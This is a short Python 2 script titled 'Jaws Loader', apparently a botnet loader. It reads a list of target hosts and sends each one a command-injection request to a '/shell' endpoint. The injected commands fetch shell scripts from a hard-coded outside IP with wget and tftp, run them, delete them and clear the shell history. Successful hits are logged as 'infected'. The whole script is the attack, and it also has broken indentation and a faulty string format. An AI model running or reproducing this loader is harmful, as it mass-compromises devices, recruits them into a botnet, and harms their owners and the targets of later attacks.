#!/usr/bin/python

# Jaws Loader

import random, socket, time, sys, requests, re, os
from multiprocessing import Process

if len(sys.argv) < 2:
    sys.exit("usage: python %s <input list> <port>" % (sys.argv[0]))

bin_names = ["ARM7", "ARM4"]
list = open(sys.argv[1], "r").readlines()
port = sys.argv[2]

def send_payload(target):
    for names in bin_names:
		print "[JAWS/1.0] attempting to infect %s with bin %s" % (target, names)
        url = "http://" + target + ":" + port + "/shell?cd /tmp; wget http://167.88.114.40/w.sh;chmod 777 w.sh;sh w.sh;tftp 167.88.114.40 -c get t.sh;chmod 777 t.sh;sh t.sh;rm -rf w.sh t.sh;history -c >/dev/null 2>&1" % (names, names)
        try:
            output = requests.get(url, timeout=3)
            if output.status_code == int('200'):
                print "[JAWS/1.0] infected %s" % (target)
                file_h = open("jaws_infected.txt", "a+")
                file_h.write(target + "\n")
                file_h.close()
				break
        except:
            pass

for i in open(sys.argv[1]).readlines():
    try:
        i = i.strip("\r\n")
        t = Process(target=send_payload, args=(i,))
        t.start()
    except KeyboardInterrupt:
        os.kill(os.getpid(), 9)
    except:
        pass